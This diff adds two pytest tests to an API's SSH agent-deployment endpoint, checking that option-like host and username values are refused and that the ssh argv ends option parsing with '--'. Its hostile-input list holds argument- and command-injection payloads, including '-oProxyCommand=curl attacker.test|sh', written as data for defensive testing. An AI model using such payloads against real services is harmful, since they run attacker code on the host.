@@ -817,6 +817,65 @@ def test_the_probe_refuses_the_platforms_own_reflection_but_not_private_space(
     }
 
 
+def test_a_destination_that_looks_like_an_ssh_option_never_reaches_argv(
+    tmp_path: Path, monkeypatch
+):
+    """``ssh`` reads a leading ``-`` as an option, not as a host.
+
+    ``-oProxyCommand=…`` is executed by ``/bin/sh`` in the API process, and it
+    runs *before* the host key is compared — so the SSRF policy and the pin
+    both sit behind it and neither one is reached. Refused at the schema, so
+    the value never becomes an argument; the argv builders pass ``--`` as the
+    second barrier, asserted below.
+    """
+    settings = make_settings(tmp_path)
+    client = configured_client(tmp_path, monkeypatch, settings=settings)
+    admin_hdrs = auth_headers(client, username="admin")
+    _stub_host_key(monkeypatch)
+    calls = _record_ssh(monkeypatch)
+
+    hostile = [
+        {"host": "-oProxyCommand=curl attacker.test|sh"},
+        {"username": "-oProxyCommand=curl attacker.test|sh"},
+        {"host": "192.168.10.50; id"},
+        {"host": "192.168.10.50 -oProxyCommand=sh"},
+    ]
+    for payload in hostile:
+        refused = client.post(
+            "/api/agent/deploy/ssh", json=_deploy_payload(**payload), headers=admin_hdrs
+        )
+        assert refused.status_code == 422, payload
+        probe = client.post(
+            "/api/agent/deploy/ssh/host-key",
+            json={"host": payload.get("host", "192.168.10.50"), "port": 22},
+            headers=admin_hdrs,
+        )
+        assert probe.status_code in (200, 422), payload
+    assert calls == []
+
+
+def test_the_ssh_argv_ends_option_parsing_before_the_destination(tmp_path: Path, monkeypatch):
+    """The schema is the first barrier; this is the one that does not depend
+    on the schema staying right."""
+    recorded: dict = {}
+
+    def fake_run(cmd, **kwargs):
+        recorded["cmd"] = cmd
+        raise AssertionError("the command must not run in a test")
+
+    monkeypatch.setattr("api.services.agent_deployer.subprocess.run", fake_run)
+    req = agent_deployer.AgentDeploySSHRequest(**_deploy_payload())
+    try:
+        agent_deployer._execute_openssh_command(
+            req, "id -u", known_hosts=str(tmp_path / "known_hosts"), timeout=5, stdin_data=None
+        )
+    except AssertionError:
+        pass
+    cmd = recorded["cmd"]
+    assert cmd[-3] == "--"
+    assert cmd[-2] == f"{req.username}@{req.host}"
+
+
 def test_a_port_outside_the_configured_ssh_list_is_refused(tmp_path: Path, monkeypatch):
     """Over an open port range the probe is a port scanner with a tidy format."""
     settings = make_settings(tmp_path)
